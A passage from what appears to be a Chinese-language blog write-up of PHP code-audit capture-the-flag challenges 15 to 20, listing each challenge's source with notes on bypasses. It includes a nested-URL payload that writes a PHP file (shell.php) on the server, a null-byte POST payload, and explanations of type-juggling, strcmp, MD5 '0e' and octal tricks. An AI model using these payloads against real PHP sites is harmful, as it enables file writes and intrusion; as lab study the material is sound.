+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;        <span class="comment">#存在GET且不为空</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];    <span class="comment">#拼接路径</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>) &gt; <span class="number">-1</span>)&#123;    <span class="comment"># $path中不含..</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SYCwaf!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$url</span>,<span class="string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="number">0</span>)&#123;          <span class="comment">#$file变量中 http://127.0.0.1/ 存 在且为开头</span></span><br><span class="line">    file_put_contents(<span class="variable">$path</span>, file_get_contents(<span class="variable">$url</span>));   <span class="comment">#读取$url内容并写入$path</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;console.log(<span class="subst">$path</span> update successed!)&quot;</span>;   <span class="comment"># 在控制台输出$path update successed!</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello.Geeker&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我拿phpinfo做了下测试，之前以为</p>
+<p><a target="_blank" rel="noopener" href="http://xxx/?path=shell.php&amp;file=http://127.0.0.1/?path=">http://XXX/?path=shell.php&amp;file=http://127.0.0.1/?path=</a><?php+phpinfo();?>&amp;file=<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1/</a></p>
+<p>里面的</p>
+<p>file=<a target="_blank" rel="noopener" href="http://127.0.0.1/?path=">http://127.0.0.1/?path=</a><?php+phpinfo();?>&amp;file=<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%88%E8%BF%99%E9%87%8Curl%E9%9C%80%E8%A6%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%AE%BF%E9%97%AE%E4%BA%86%E4%B8%A4%E6%AC%A1%EF%BC%89">http://127.0.0.1/（这里url需要二次编码，因为访问了两次）</a></p>
+<p>写入到shell.php文件里面后就和题目的源码独立出来了，后来改改参数测试了下发现并没有，然后一切问题迎刃而解。</p>
+<p>这个题目要的就是把shell.php构造为一个webshell，通过用URL请求这个webshell的页面并写入到path文件</p>
+<p>URL二层嵌套，这两层都需要符合题目要求，即<code>$path中不含..  $file变量中 http://127.0.0.1/ 存在                                                       且为开头</code>所以很容易就可以构造出可以绕过的payload</p>
+<h1 id="challenge-16"><a href="#challenge-16" class="headerlink" title="challenge 16"></a>challenge 16</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]))    </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>]))   <span class="comment"># POST方式提交submit和hihi</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>]) === <span class="literal">FALSE</span>)  <span class="comment">#hihi里只存在字母和数字</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;have fun:)&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>]) &lt; <span class="number">11</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>] &gt; <span class="number">999999999</span>) <span class="comment"># hihi长度小   于11且数值大于999999999</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>], <span class="string">&#x27;#HONG#&#x27;</span>) !== <span class="literal">FALSE</span>)    <span class="comment">#hihi中存在#HONG#</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;hihi&#x27;</span>])) &#123;                  <span class="comment">#hihi不为数组</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;nonono&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;nonono&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;sorry&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">submit</span>=<span class="number">1</span>&amp;hihi=<span class="number">9</span>e<span class="number">9</span>%<span class="number">00</span>#HONG#</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="challenge-17"><a href="#challenge-17" class="headerlink" title="challenge 17"></a>challenge 17</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$smile</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;        <span class="comment"># 存在^_^</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;\.&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;     <span class="comment"># 不存在\.</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;%&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;         <span class="comment"># 不存在%</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;[0-9]&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;      <span class="comment"># 不存在数字</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;http&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>]) ) <span class="variable">$smile</span> = <span class="number">0</span>;      <span class="comment"># 不存在http</span></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;https&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>]) ) <span class="variable">$smile</span> = <span class="number">0</span>;     </span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;ftp&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;telnet&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&#x27;_&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;  <span class="comment">#url ?后面不存在_</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$smile</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@file_exists (<span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>])) <span class="variable">$smile</span> = <span class="number">0</span>;   <span class="comment"># 不存在file_exists寻找的文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$smile</span> = @file_get_contents (<span class="variable">$_GET</span>[<span class="string">&#x27;^_^&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$smile</span> === <span class="string">&quot;(●&#x27;◡&#x27;●)&quot;</span>) <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/18/0203/09/52553745_727370869.shtml">$_SERVER[‘QUERY_STRING’]</a></p>
+<blockquote>
+<p>搜索引擎会忽略下划线的存在<br>当<code>.</code>或<code>[]</code>之类的符号作为参数的key的时候，会被PHP改写为<code>_</code><br>file_exists对data指向的内容判断为不存在<br>$_SERVER[‘QUERY_STRING’]：QUERY_STRING就是URL后接的参数，如<a target="_blank" rel="noopener" href="http://www.baidu.com/?a=B%EF%BC%8Ca=B%E5%B0%B1%E6%98%AFQUERY_STRING">www.baidu.com/?a=B，a=B就是QUERY_STRING</a></p>
+<p>“data”类型的Url格式，目的对于一些“小”的数据，可以在网页中直接嵌入，而不是从外部文件载入。</p>
+</blockquote>
+<h1 id="challenge-18"><a href="#challenge-18" class="headerlink" title="challenge 18"></a>challenge 18</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))             <span class="comment">#存在login</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))               <span class="comment">#存在user</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(@strcmp(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>],<span class="variable">$USER</span>))<span class="comment">//USER是被隐藏的复杂用户名     #比较大小</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;user错误！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))     <span class="comment">#存在name和password</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] )     <span class="comment">#弱等于</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;账号密码不能一致！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))     <span class="comment">#md5强等于</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(is_numeric(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]!==<span class="string">&#x27;72&#x27;</span> &amp;&amp; !preg_match(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="number">72</span>)</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;flag&#123;xxxxxxxxxxxxx&#125;&quot;</span>);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;ID错误2！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;ID错误1！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;账号密码错误！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p><code>72.</code>     是数字字符串<br>MD5不能处理数组，处理任意数组返回值都相同<br>MD5每一个以0E开头的哈希值都解释为0<br>strcmp函数用于比较两个字符串并根据比较结果返回整数,可改成数据类型绕过</p>
+</blockquote>
+<h1 id="challenge-19"><a href="#challenge-19" class="headerlink" title="challenge 19"></a>challenge 19</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sss&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="string">&#x27;challenge19.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sss&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$sss</span>)==<span class="number">666</span>)&#123;            <span class="comment">#长度等于666</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[^0-6]/&quot;</span>,<span class="variable">$sss</span>))&#123;     <span class="comment">#只能存在0-6的数字 </span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$sss=&#x27;</span>.<span class="variable">$sss</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$sss</span>!==<span class="string">&#x27;0x666&#x27;</span>)&#123;      <span class="comment">#这里的0x是十六进制的意思</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$sss</span>==<span class="string">&#x27;0x666&#x27;</span>)&#123;     <span class="comment"># $sss 的值需要等于数值 0×666，而又不能等于字符串’0×666′，</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>需要创建一个长度为 666 ,只包含0 — 6的数字，数值上等于 0×666且不等于字符串 ’0×666′的参数,十六进制666转换可以发现八进制时在数字0-6之间</p>
+<blockquote>
+<p>1、十六进制：0x开头<br>2、八进制：0开头<br>3、二进制：0b开头</p>
+</blockquote>
+<h1 id="challenge-20"><a href="#challenge-20" class="headerlink" title="challenge 20"></a>challenge 20</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))</span><br><span class="line">	<span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;xxoo&#x27;</span>];              <span class="comment">#$user 是一个数组, [0 =&gt; ‘admin’, 1 =&gt; ‘xxoo’]</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="variable">$user</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>][<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜  ~  php -r “var_dump([1=&gt;0]==[1=&gt;0]);”<br>bool(true)</p>
+</blockquote>
+<blockquote>
+<p>➜  ~  php -r  “var_dump([1=&gt;0]===[1=&gt;0]);”<br>bool(true)</p>
+</blockquote>
+<blockquote>
+<p>➜  ~  php -r “var_dump([1=&gt;0]==[2=&gt;0]);”<br>bool(false)</p>
+</blockquote>
+<blockquote>
+<p>➜  ~  php -r “var_dump([1=&gt;0]===[2=&gt;0]);”<br>bool(false)</p>
+</blockquote>
+<blockquote>
+<p>➜  ~  php -r “var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);”  #键名为 0 与0x100000000` 数组相等<br>bool(true)</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>安小琪
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://npfs06.top/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="PHP_Code_challenge(代码审计)">https://npfs06.top/2020/04/20/PHP-Code-challenge-代码审计/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/17/%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%BA%94%E7%94%A8/" rel="prev" title="超全局变量$GLOBALS的应用">
+      <i class="fa fa-chevron-left"></i> 超全局变量$GLOBALS的应用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/21/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" rel="next" title="web源码泄露">
+      web源码泄露 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-1"><span class="nav-number">1.</span> <span class="nav-text">challenge 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-2"><span class="nav-number">2.</span> <span class="nav-text">challenge 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-3"><span class="nav-number">3.</span> <span class="nav-text">challenge 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-4"><span class="nav-number">4.</span> <span class="nav-text">challenge 4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-5"><span class="nav-number">5.</span> <span class="nav-text">challenge 5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-6"><span class="nav-number">6.</span> <span class="nav-text">challenge 6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-7"><span class="nav-number">7.</span> <span class="nav-text">challenge 7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-8"><span class="nav-number">8.</span> <span class="nav-text">challenge 8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-9"><span class="nav-number">9.</span> <span class="nav-text">challenge 9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-10"><span class="nav-number">10.</span> <span class="nav-text">challenge 10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-11"><span class="nav-number">11.</span> <span class="nav-text">challenge 11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-12"><span class="nav-number">12.</span> <span class="nav-text">challenge 12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-13"><span class="nav-number">13.</span> <span class="nav-text">challenge 13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-14"><span class="nav-number">14.</span> <span class="nav-text">challenge 14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-15"><span class="nav-number">15.</span> <span class="nav-text">challenge 15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-16"><span class="nav-number">16.</span> <span class="nav-text">challenge 16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-17"><span class="nav-number">17.</span> <span class="nav-text">challenge 17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-18"><span class="nav-number">18.</span> <span class="nav-text">challenge 18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-19"><span class="nav-number">19.</span> <span class="nav-text">challenge 19</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge-20"><span class="nav-number">20.</span> <span class="nav-text">challenge 20</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
